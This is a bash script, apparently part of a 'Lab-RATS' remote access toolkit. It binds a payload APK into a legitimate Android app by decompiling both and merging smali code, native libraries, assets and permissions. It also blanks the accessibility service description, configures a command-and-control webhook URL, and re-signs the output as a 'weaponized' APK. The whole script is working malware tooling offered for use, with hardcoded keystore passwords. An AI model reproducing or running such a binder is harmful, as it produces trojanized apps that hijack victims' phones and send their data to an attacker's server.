#!/bin/bash

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    echo " ┌───────────────────────────────────────────────────────────────────────┐"
    echo " │                                  .-         .                         │"
    echo " │                               ....-        :                          │"
    echo " │                            -==--+:.+. ..  -..+:-+                     │"
    echo " │                            ++---:+.-==+==#:.+---+#                    │"
    echo " │                             :=---:+++++=++=**-:-:                     │"
    echo " │                               --+++:-=+++++++-=                       │"
    echo " │                  .-.         :--+==:++-:-**+-+-                       │"
    echo " │                    -.     .==:--+:+++=++++++++#.                      │"
    echo " │                    :-    =---=::-++.=:.=.-==+....                     │"
    echo " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │"
    echo " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │"
    echo " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │"
    echo " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │"
    echo " │                .-=:  .---=++++-++++#####*++..::--. .                  │"
    echo " │                 .--++.--:----=+---=-++#++==.       .                  │"
    echo " │                   --------=--:=:-:-====+++-                           │"
    echo " │                       .--++++--++:+++==:=+.                           │"
    echo " │                        .:+++::::--:..:-+=                             │"
    echo " │                       .--=+=-+-+    -:---*---                         │"
    echo " │                                                                       │"
    echo " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │"
    echo " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │"
    echo " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │"
    echo " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │"
    echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
    echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"
    echo " │                                                                       │"
    echo " │     Smali Surgery & APK Binding Script (Unix) | v1.6.0 Hardened       │"
    echo " │                                                                       │"
    echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
    echo " │                         DEVELOPED BY K4N3CO                           │"
    echo " │                               © 2026                                  │"
    echo " └───────────────────────────────────────────────────────────────────────┘"
    echo -e "${NC}"
    echo ""
}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
WORK_DIR="$SCRIPT_DIR/temp_binder"
OUTPUT_DIR="$PROJECT_DIR/bind_output"
TOOLS_DIR="$SCRIPT_DIR/tools"

mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output" "$TOOLS_DIR"

echo -e "${CYAN}"
echo " ┌───────────────────────────────────────────────────────────────────────┐"
echo " │               Lab-RATS Smali Surgery & APK Binder                    │"
echo " └───────────────────────────────────────────────────────────────────────┘"
echo -e "${NC}"

# 1. Target APK
if [ -z "$1" ]; then
    read -p "    Enter path to target clean APK: " TARGET_APK
else
    TARGET_APK="$1"
fi

if [ ! -f "$TARGET_APK" ]; then
    echo -e "${RED}[!] Target APK file not found: $TARGET_APK${NC}"
    exit 1
fi

TARGET_APK_DIR="$(cd "$(dirname "$TARGET_APK")" && pwd)"
TARGET_APK_NAME="$(basename "$TARGET_APK")"
TARGET_APK_ABS="$TARGET_APK_DIR/$TARGET_APK_NAME"

# 2. Payload APK
PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
if [ ! -f "$PAYLOAD_APK" ]; then
    PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/debug/app-debug.apk"
fi
if [ ! -f "$PAYLOAD_APK" ]; then
    PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
fi

if [ ! -f "$PAYLOAD_APK" ]; then
    echo -e "${YELLOW}[!] Payload APK not found. Building release payload via Gradle...${NC}"
    cd "$PROJECT_DIR"
    chmod +x gradlew
    ./gradlew assembleRelease --no-daemon
    if [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
        PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
    else
        echo -e "${RED}[!] Payload APK compilation failed.${NC}"
        exit 1
    fi
    cd "$SCRIPT_DIR"
fi

# 3. Detect / Download Apktool
APKTOOL_CMD=""
if command -v apktool &> /dev/null; then
    APKTOOL_CMD="apktool"
elif [ -f "$TOOLS_DIR/apktool.jar" ]; then
    APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
else
    echo -e "${YELLOW}[!] apktool not found on system PATH. Downloading apktool.jar...${NC}"
    curl -sL -o "$TOOLS_DIR/apktool.jar" "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
    if [ -f "$TOOLS_DIR/apktool.jar" ]; then
        echo -e "${GREEN}[✓] Downloaded apktool.jar${NC}"
        APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
    else
        echo -e "${RED}[!] Failed to download apktool.jar. Please install apktool.${NC}"
        exit 1
    fi
fi

# Clean previous working dir
rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"

PAYLOAD_DIR="$WORK_DIR/payload"
TARGET_DIR="$WORK_DIR/target"

# 4. Decompile APKs
echo -e "${CYAN}[*] Decompiling payload APK...${NC}"
$APKTOOL_CMD d -f -o "$PAYLOAD_DIR" "$PAYLOAD_APK"

if [ ! -d "$PAYLOAD_DIR" ]; then
    echo -e "${RED}[!] Payload APK decompilation failed.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# Check if Target APK is an XAPK / APKM / APKS zip bundle containing base.apk
BUNDLE_EXTRACT_DIR="$WORK_DIR/bundle_extracted"
$PYTHON_BIN "$TOOLS_DIR/surgery.py" extract_bundle "$TARGET_APK_ABS" "$BUNDLE_EXTRACT_DIR"

if [ -f "$BUNDLE_EXTRACT_DIR/extracted_base.txt" ]; then
    EXTRACTED_BASE=$(cat "$BUNDLE_EXTRACT_DIR/extracted_base.txt")
    if [ -f "$EXTRACTED_BASE" ]; then
        TARGET_APK_ABS="$EXTRACTED_BASE"
        echo -e "${GREEN}[✓] Extracted standalone base.apk from App Bundle container.${NC}"
    fi
fi

echo -e "${CYAN}[*] Decompiling target clean APK...${NC}"
$APKTOOL_CMD d -f -o "$TARGET_DIR" "$TARGET_APK_ABS"

if [ ! -f "$TARGET_DIR/AndroidManifest.xml" ]; then
    echo -e "${YELLOW}[!] Standard decompilation failed. Retrying with resource-preservation (-r)...${NC}"
    rm -rf "$TARGET_DIR"
    $APKTOOL_CMD d -f -r -o "$TARGET_DIR" "$TARGET_APK_ABS"
fi

# 5. Merge Smali Classes, Assets & Surgery
echo -e "${CYAN}[*] Merging Smali bytecode, assets, and performing surgery...${NC}"

# Copy Assets
if [ -d "$PAYLOAD_DIR/assets" ]; then
    mkdir -p "$TARGET_DIR/assets"
    cp -rn "$PAYLOAD_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
fi

# Copy native libs if present
if [ -d "$PAYLOAD_DIR/lib" ]; then
    mkdir -p "$TARGET_DIR/lib"
    cp -rn "$PAYLOAD_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
fi

# Decompile and merge any split config APKs in target folder
TARGET_FOLDER=$(dirname "$TARGET_APK_ABS")
for split_apk in "$TARGET_FOLDER"/*config*.apk "$TARGET_FOLDER"/*split*.apk; do
    if [ -f "$split_apk" ] && [ "$split_apk" != "$TARGET_APK_ABS" ]; then
        echo -e "${CYAN}[*] Merging split APK resources from $(basename "$split_apk")...${NC}"
        SPLIT_DIR="$WORK_DIR/split_tmp"
        mkdir -p "$SPLIT_DIR"
        $APKTOOL_CMD d -f -o "$SPLIT_DIR" "$split_apk" 2>/dev/null || true
        [ -d "$SPLIT_DIR/lib" ] && cp -rn "$SPLIT_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
        [ -d "$SPLIT_DIR/assets" ] && cp -rn "$SPLIT_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
        [ -d "$SPLIT_DIR/res" ] && cp -rn "$SPLIT_DIR/res"/* "$TARGET_DIR/res/" 2>/dev/null || true
        rm -rf "$SPLIT_DIR"
    fi
done

if [ -f "$TARGET_DIR/res/xml/accessibility_service_config.xml" ]; then
    sed -i.bak 's|android:description="[^"]*"||g' "$TARGET_DIR/res/xml/accessibility_service_config.xml" 2>/dev/null
    rm -f "$TARGET_DIR/res/xml/accessibility_service_config.xml.bak"
fi

# C2 Webhook URL Configuration
EXISTING_WEBHOOK=""
if [ -f "$PROJECT_DIR/local.properties" ]; then
    EXISTING_WEBHOOK=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
fi

echo -e "\n${CYAN}[*] Configuring C2 Webhook URL for Bound Target...${NC}"
if [ -n "$EXISTING_WEBHOOK" ]; then
    echo -e "${YELLOW}    Current Webhook URL: $EXISTING_WEBHOOK${NC}"
    read -p "    Enter C2 Webhook URL [Press Enter to Keep Current]: " WEB_URL
    WEB_URL=${WEB_URL:-$EXISTING_WEBHOOK}
else
    read -p "    Enter C2 Webhook URL (e.g. https://lab-rats-c2.onrender.com): " WEB_URL
fi

WEB_URL_CLEAN="$(echo "$WEB_URL" | sed 's|/$||')"

TARGET_MANIFEST="$TARGET_DIR/AndroidManifest.xml"
PAYLOAD_MANIFEST="$PAYLOAD_DIR/AndroidManifest.xml"
PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" 2>/dev/null | head -n1 | cut -d'"' -f2)
[ -z "$PKG_NAME" ] && PKG_NAME="com.target.app"

# Extract permissions from payload
grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
    PERM_NAME=$(echo "$perm" | grep -o 'android:name="[^"]*"' | cut -d'"' -f2)
    if [ -n "$PERM_NAME" ] && ! grep -q "$PERM_NAME" "$TARGET_MANIFEST"; then
        sed -i.bak "s|<application|    $perm\n    <application|1" "$TARGET_MANIFEST"
    fi
done

PYTHON_BIN="/usr/bin/python3"
if [ ! -x "$PYTHON_BIN" ]; then
    PYTHON_BIN="$(command -v python3 || command -v python)"
fi

echo -e "${CYAN}[*] Performing Smali, Manifest & Resource Surgery via surgery.py...${NC}"
$PYTHON_BIN "$TOOLS_DIR/surgery.py" "$PAYLOAD_DIR" "$TARGET_DIR" "$PKG_NAME" "$WEB_URL_CLEAN"

echo -e "${GREEN}[✓] Smali surgery, Manifest injection & Resource sanitization complete.${NC}"

# 9. Recompile & Sign
echo -e "${CYAN}[*] Rebuilding bound APK...${NC}"
UNSIGNED_APK="$WORK_DIR/unsigned_bound.apk"
ALIGNED_APK="$WORK_DIR/aligned_bound.apk"
FINAL_BOUND_APK="$OUTPUT_DIR/bound_target.apk"

# Attempt 1: Rebuild with stable AAPT2 (34.0.0)
if [ -n "$AAPT2_BIN" ]; then
    $APKTOOL_CMD b --aapt "$AAPT2_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
else
    $APKTOOL_CMD b --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
fi

if [ ! -f "$UNSIGNED_APK" ]; then
    echo -e "${RED}[!] Rebuilding bound APK failed. Check apktool / aapt2 logs above.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# Auto-detect zipalign & apksigner from Android SDK build-tools if not in PATH
ZIPALIGN_CMD="zipalign"
if ! command -v zipalign &> /dev/null; then
    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/zipalign" ]; then
        ZIPALIGN_CMD="$STABLE_BT/zipalign"
    fi
fi

APKSIGNER_CMD="apksigner"
if ! command -v apksigner &> /dev/null; then
    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/apksigner" ]; then
        APKSIGNER_CMD="$STABLE_BT/apksigner"
    fi
fi

# Strip old target signatures from unsigned APK before alignment and apksigner to prevent inconsistent signature errors
if command -v zip &> /dev/null; then
    zip -d "$UNSIGNED_APK" "META-INF/*" 2>/dev/null || true
fi

echo -e "${CYAN}[*] Aligning & Signing bound APK...${NC}"
if command -v "$ZIPALIGN_CMD" &> /dev/null || [ -f "$ZIPALIGN_CMD" ]; then
    "$ZIPALIGN_CMD" -p -f -v 4 "$UNSIGNED_APK" "$ALIGNED_APK"
else
    ALIGNED_APK="$UNSIGNED_APK"
fi

KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"

if [ -f "$KEYSTORE_PATH" ]; then
    if ! keytool -list -keystore "$KEYSTORE_PATH" -alias "lab-rats-key" -storepass "lab-rats123" &>/dev/null; then
        echo -e "${YELLOW}[!] Keystore alias 'lab-rats-key' missing in $KEYSTORE_PATH. Regenerating keystore...${NC}"
        rm -f "$KEYSTORE_PATH"
    fi
fi

if [ ! -f "$KEYSTORE_PATH" ]; then
    echo -e "${YELLOW}[!] Keystore missing or invalid. Generating fresh keystore...${NC}"
    keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
    keytool -genkeypair -alias "render" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
fi

mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output"

if command -v "$APKSIGNER_CMD" &> /dev/null || [ -f "$APKSIGNER_CMD" ]; then
    "$APKSIGNER_CMD" sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK" 2>/dev/null || true
fi

if [ ! -f "$FINAL_BOUND_APK" ]; then
    if command -v jarsigner &> /dev/null; then
        jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key" 2>/dev/null || true
    fi
    cp -f "$ALIGNED_APK" "$FINAL_BOUND_APK"
fi

cp -f "$FINAL_BOUND_APK" "$SCRIPT_DIR/bind_output/bound_target.apk" 2>/dev/null || true

rm -rf "$WORK_DIR"

echo -e "\n${GREEN}[✓] SUCCESS: WEAPONIZED BOUND APK CREATED AT:${NC}"
echo -e "${CYAN}    $FINAL_BOUND_APK${NC}\n"
